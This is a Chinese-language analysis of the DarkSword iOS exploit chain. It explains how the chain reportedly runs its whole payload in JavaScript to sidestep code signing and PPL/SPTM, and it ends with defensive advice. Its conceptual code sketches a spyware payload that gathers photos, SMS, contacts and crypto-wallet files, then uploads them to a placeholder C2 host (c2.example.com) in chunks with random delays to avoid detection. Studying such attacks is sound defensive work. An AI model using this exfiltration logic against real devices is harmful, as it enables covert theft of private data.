# DarkSword的JavaScript纯脚本攻击模式研究：为何不需要传统Native Payload

## 摘要

2026年公开的DarkSword漏洞利用工具集展示了一种独特的攻击模式：整个攻击链以及最终payload都采用纯JavaScript实现，无需传统的native二进制payload。这一设计选择不仅规避了部分安全缓解措施，还展示了现代攻击技术的灵活性。本文深入分析DarkSword的JavaScript攻击模式，探讨其技术原理、优势以及与传统攻击方式的差异。

## 一、传统攻击模式 vs JavaScript攻击模式

### 1.1 传统iOS攻击链

典型的iOS高级攻击链通常包含以下阶段：

```text
传统攻击链：

1. 浏览器漏洞利用（Assembly/C）
   └─ 获得代码执行能力
   
2. 构建native payload（机器码）
   └─ 编译为ARM64二进制
   
3. 绕过代码签名
   └─ 需要kernel漏洞或PPL绕过
   
4. 执行native payload
   └─ 加载并运行未签名的机器码
```

这种模式的关键瓶颈在于第3步：iOS的代码签名机制阻止了未签名的native代码执行。

### 1.2 DarkSword的创新

DarkSword采用了完全不同的路径：

```text
DarkSword攻击链：

1. JavaScriptCore漏洞利用（JavaScript）
   └─ 获得内存读写能力
   
2. 构建JavaScript-based primitives
   └─ 在JS层面实现任意读写
   
3. 利用系统API（JavaScript + Native API调用）
   └─ 通过IPC调用系统服务
   
4. JavaScript payload
   └─ 完全在JS环境中执行
```

关键区别：DarkSword从未尝试执行未签名的native代码。

## 二、JavaScript攻击模式的技术基础

### 2.1 JavaScriptCore的能力边界

JavaScriptCore（JSC）作为JavaScript引擎，提供了丰富的API与系统交互。

```text
JSC能力：

✓ 内存分配和管理
✓ 网络请求（XMLHttpRequest, Fetch）
✓ 文件系统访问（受限）
✓ 加密操作（Web Crypto API）
✓ 定时器（setTimeout, setInterval）
✓ 类型化数组（TypedArray）
✗ 直接执行系统调用
✗ 访问任意内存（需要漏洞）
```

### 2.2 通过漏洞扩展能力

当攻击者通过漏洞获得JSC内部的代码执行能力后，可以突破上述限制。

```text
漏洞利用后的能力：

✓ 任意内存读写
✓ 绕过沙箱限制（部分）
✓ 调用内部API
✓ 访问其他进程（通过IPC）
✓ 修改系统状态
```

### 2.3 JavaScript与Native的桥接

iOS提供了多种JavaScript与native代码交互的机制。

```text
桥接机制：

1. JavaScriptCore C API
   - JSObjectMakeTypedArrayWithBytesNoCopy
   - 允许JS直接访问native内存
   
2. WKScriptMessageHandler
   - Web页面 → Native应用
   - 通过postMessage传递数据
   
3. XPC Services
   - 进程间通信
   - JavaScript可以通过IPC调用系统服务
```

DarkSword正是利用这些桥接机制，在不完全脱离JavaScript环境的情况下，实现了对系统的深度控制。

## 三、DarkSword的JavaScript攻击实现

### 3.1 内存操作抽象

DarkSword首先构建了一套JavaScript层面的内存操作抽象。

```javascript
// 概念代码（实际实现更复杂）

class MemoryAccessor {
    constructor(readPrimitive, writePrimitive) {
        this.read64 = readPrimitive;
        this.write64 = writePrimitive;
    }
    
    readString(addr) {
        let result = "";
        let offset = 0;
        while (true) {
            let byte = this.read64(addr + offset) & 0xFF;
            if (byte === 0) break;
            result += String.fromCharCode(byte);
            offset++;
        }
        return result;
    }
    
    writeString(addr, str) {
        for (let i = 0; i < str.length; i++) {
            this.write64(addr + i, str.charCodeAt(i));
        }
        this.write64(addr + str.length, 0); // null terminator
    }
    
    readPointer(addr) {
        return this.read64(addr);
    }
    
    writePointer(addr, value) {
        this.write64(addr, value);
    }
}
```

这套抽象使得后续的利用代码更加模块化和可维护。

### 3.2 系统接口调用

DarkSword通过IPC机制调用系统服务。

```javascript
// 概念代码

class SystemInterface {
    constructor(memAccessor) {
        this.mem = memAccessor;
        this.xpcConnection = this.setupXPC();
    }
    
    setupXPC() {
        // 建立与系统服务的XPC连接
        // 通过漏洞绕过沙箱限制
        return XPCConnect("com.apple.some_service");
    }
    
    callService(method, params) {
        // 构造XPC消息
        let msg = XPCMessageCreate(method, params);
        
        // 发送并等待响应
        let response = XPCSendSync(this.xpcConnection, msg);
        
        return response;
    }
    
    // 示例：读取文件
    readFile(path) {
        return this.callService("read_file", {path: path});
    }
    
    // 示例：获取设备信息
    getDeviceInfo() {
        return this.callService("get_device_info", {});
    }
}
```

### 3.3 Payload逻辑

DarkSword的最终payload完全在JavaScript中实现。

```javascript
// 概念代码

class Payload {
    constructor(sysInterface) {
        this.sys = sysInterface;
    }
    
    async execute() {
        // 1. 收集设备信息
        let deviceInfo = this.sys.getDeviceInfo();
        
        // 2. 搜索敏感数据
        let sensitiveData = await this.searchSensitiveData();
        
        // 3. 上传到C2服务器
        await this.uploadToC2(deviceInfo, sensitiveData);
        
        // 4. 清理痕迹
        this.cleanup();
    }
    
    async searchSensitiveData() {
        let results = [];
        
        // 搜索照片
        let photos = this.sys.readFile("/var/mobile/Media/DCIM/");
        results.push({type: "photos", data: photos});
        
        // 搜索备忘录
        let notes = this.sys.readFile("/var/mobile/Library/Notes/");
        results.push({type: "notes", data: notes});
        
        // 搜索加密货币钱包
        let wallets = this.searchCryptoWallets();
        results.push({type: "wallets", data: wallets});
        
        return results;
    }
    
    searchCryptoWallets() {
        // 搜索常见的钱包应用数据目录
        let walletPaths = [
            "/var/mobile/Containers/Data/Application/*/Documents/wallet.dat",
            "/var/mobile/Library/Application Support/*/keys.json",
            // ...
        ];
        
        let results = [];
        for (let path of walletPaths) {
            let files = this.sys.glob(path);
            for (let file of files) {
                let content = this.sys.readFile(file);
                if (this.looksLikeWallet(content)) {
                    results.push({path: file, content: content});
                }
            }
        }
        
        return results;
    }
    
    async uploadToC2(deviceInfo, data) {
        // 加密数据
        let encrypted = await this.encrypt(data);
        
        // 通过HTTPS上传
        await fetch("https://c2.example.com/upload", {
            method: "POST",
            body: JSON.stringify({
                device: deviceInfo,
                data: encrypted
            })
        });
    }
}
```

## 四、JavaScript攻击模式的优势

### 4.1 绕过代码签名

传统攻击需要执行未签名的native代码，这受到iOS代码签名机制的严格限制。

```text
代码签名检查：

amfid (Apple Mobile File Integrity Daemon)
    │
    ├─ 验证应用签名
    │
    ├─ 验证动态库签名
    │
    └─ 验证内存中的代码页
    
JavaScript攻击：
✓ 不需要加载新的native代码
✓ 所有操作都在已签名的JavaScriptCore进程中
✓ 不触发amfid检查
```

### 4.2 规避PPL/SPTM保护

Protected Process Layer (PPL) 和 Secure Process Translation Map (SPTM) 保护关键系统组件不被修改。

```text
PPL/SPTM保护：

- 内核代码段
- 系统应用
- 关键系统服务

传统攻击：
✗ 需要绕过PPL/SPTM才能修改受保护代码

JavaScript攻击：
✓ 不修改受保护代码
✓ 利用现有接口和功能
✓ 在合法框架内操作
```

### 4.3 降低检测风险

Native payload通常具有明显的特征，容易被安全软件检测。

```text
检测对比：

Native Payload：
- 异常的内存分配模式
- 未签名的代码页
- 可疑的系统调用
- 已知的exploit特征码

JavaScript Payload：
- 看起来像正常的JavaScript执行
- 没有新的代码页
- 系统调用来自已签名进程
- 特征码更难提取
```

### 4.4 跨平台兼容性

JavaScript是跨平台的，同一套代码可以在不同iOS版本上运行（只要漏洞存在）。

```text
Native Payload：
- 需要针对不同架构编译（ARM64, ARM64e）
- 需要考虑PAC（Pointer Authentication Code）
- 版本依赖性强

JavaScript Payload：
- 统一的JavaScript环境
- 自动处理架构差异
- 更好的版本兼容性
```

## 五、JavaScript攻击模式的局限

### 5.1 性能限制

JavaScript的执行速度远低于native代码。

```text
性能对比：

操作：加密1GB数据

Native (C): ~10秒
JavaScript: ~100秒（10倍慢）

影响：
- 大量数据处理效率低
- 复杂计算耗时长
- 可能被用户察觉
```

### 5.2 能力边界

某些操作在JavaScript中难以实现。

```text
JavaScript难以实现的操作：

✗ 直接操作硬件
✗ 内核级操作（需要kernel漏洞）
✗ 某些底层系统调用
✗ 高性能网络扫描
✗ 复杂的密码学操作（虽然Web Crypto API提供部分支持）
```

### 5.3 依赖漏洞

JavaScript攻击模式仍然依赖漏洞来获得初始能力。

```text
攻击链依赖：

1. JavaScriptCore漏洞（必需）
   └─ 没有漏洞，无法突破沙箱
   
2. 系统服务漏洞（可选）
   └─ 用于扩展能力
   
3. Kernel漏洞（可选）
   └─ 用于最高权限
```

如果JavaScriptCore漏洞被修复，整个攻击链就失效了。

## 六、DarkSword的具体实现分析

### 6.1 漏洞利用阶段

DarkSword使用了6个漏洞来完成攻击链。

```text
DarkSword漏洞利用时序：

1. CVE-2025-31277 (JavaScriptCore JIT类型混淆)
   └─ 初始代码执行
   
2. CVE-2025-43529 (JavaScriptCore GC相关缺陷)
   └─ 增强内存控制
   
3. CVE-2025-43510 (XNU copy-on-write漏洞)
   └─ 在mediaplaybackd中建立利用能力
   
4-6. 其他漏洞
   └─ 沙箱逃逸、权限提升等
```

### 6.2 JavaScript-based Primitives

DarkSword在JavaScript层面构建了强大的原语。

```javascript
// 概念代码

class DarkSwordPrimitives {
    constructor() {
        this.memAccessor = this.setupMemoryAccessor();
        this.sysInterface = this.setupSystemInterface();
    }
    
    setupMemoryAccessor() {
        // 利用CVE-2025-31277建立内存读写能力
        let typeConfusion = this.triggerTypeConfusion();
        let fakeObj = this.createFakeObject(typeConfusion);
        
        return new MemoryAccessor(
            (addr) => this.readViaFakeObj(fakeObj, addr),
            (addr, val) => this.writeViaFakeObj(fakeObj, addr, val)
        );
    }
    
    setupSystemInterface() {
        // 利用CVE-2025-43510建立系统接口调用能力
        let cowExploit = this.triggerCOWExploit();
        
        return new SystemInterface(this.memAccessor, cowExploit);
    }
    
    // 所有后续操作都基于这些primitives
}
```

### 6.3 纯JavaScript Payload

DarkSword的payload完全用JavaScript编写。

```javascript
// 概念代码

class DarkSwordPayload {
    constructor(primitives) {
        this.p = primitives;
    }
    
    async run() {
        // 1. 环境检查
        if (!this.checkEnvironment()) {
            return; // 静默退出
        }
        
        // 2. 数据收集
        let data = await this.collectData();
        
        // 3. 数据 exfiltration
        await this.exfiltrate(data);
        
        // 4. 持久化（可选）
        await this.persist();
    }
    
    async collectData() {
        let data = {};
        
        // 设备信息
        data.device = this.p.sys.getDeviceInfo();
        
        // 联系人
        data.contacts = this.p.sys.getContacts();
        
        // 短信
        data.sms = this.p.sys.getSMS();
        
        // 照片（缩略图）
        data.photos = this.p.sys.getPhotoThumbnails();
        
        // 加密货币钱包
        data.crypto = this.searchCryptoWallets();
        
        return data;
    }
    
    async exfiltrate(data) {
        // 分块上传，避免被检测
        let chunks = this.chunkData(data, 1024 * 1024); // 1MB chunks
        
        for (let chunk of chunks) {
            await this.uploadChunk(chunk);
            await this.sleep(Math.random() * 5000 + 1000); // 随机延迟
        }
    }
}
```

## 七、安全启示

### 7.1 对开发者的启示

JavaScript攻击模式表明，即使不执行native代码，攻击者也能造成严重威胁。

```text
开发者应注意：

1. 不要假设JavaScript是"安全"的
   - JavaScript可以访问敏感数据
   - JavaScript可以调用系统API
   
2. 严格审查JavaScript权限
   - 限制文件系统访问
   - 限制网络访问
   - 限制IPC调用
   
3. 监控异常JavaScript行为
   - 大量内存分配
   - 频繁的系统调用
   - 异常的数据传输
```

### 7.2 对安全研究者的启示

DarkSword展示了攻击技术的创新方向。

```text
研究方向：

1. JavaScript引擎安全
   - JIT编译器漏洞
   - 类型系统安全
   - 垃圾回收安全
   
2. 桥接机制安全
   - JavaScript ↔ Native边界
   - IPC接口安全
   - 权限边界验证
   
3. 检测方法
   - JavaScript行为分析
   - 异常模式识别
   - 机器学习检测
```

### 7.3 对用户的启示

用户需要了解JavaScript攻击的风险。

```text
用户防护：

1. 及时更新系统
   - 修复JavaScriptCore漏洞
   
2. 启用锁定模式
   - 限制JavaScript能力
   
3. 谨慎访问网页
   - 不访问可疑链接
   - 注意浏览器异常行为
   
4. 使用内容拦截器
   - 减少恶意JavaScript执行机会
```

## 八、结论

DarkSword的JavaScript纯脚本攻击模式代表了现代iOS攻击技术的一个重要方向。通过完全在JavaScript环境中实现攻击链，DarkSword成功规避了传统的代码签名、PPL/SPTM等安全机制，展示了攻击技术的灵活性和创新性。

这种攻击模式的核心在于：

1. **不突破安全边界，而是利用现有接口** — 在合法框架内操作
2. **不执行native代码，而是扩展JavaScript能力** — 通过漏洞增强JavaScript环境
3. **不修改系统代码，而是调用系统服务** — 利用IPC机制

对于安全研究而言，DarkSword提醒我们：

- JavaScript引擎的安全性至关重要
- 桥接机制（JavaScript ↔ Native）是重要的攻击面
- 传统的代码签名保护并非万能

对于防御而言，需要及时修复JavaScriptCore漏洞，严格审查JavaScript权限，并开发针对JavaScript攻击的检测方法。

DarkSword的出现表明，高级攻击技术正在从"暴力突破"向"巧妙利用"演进，这对整个移动安全生态提出了新的挑战。
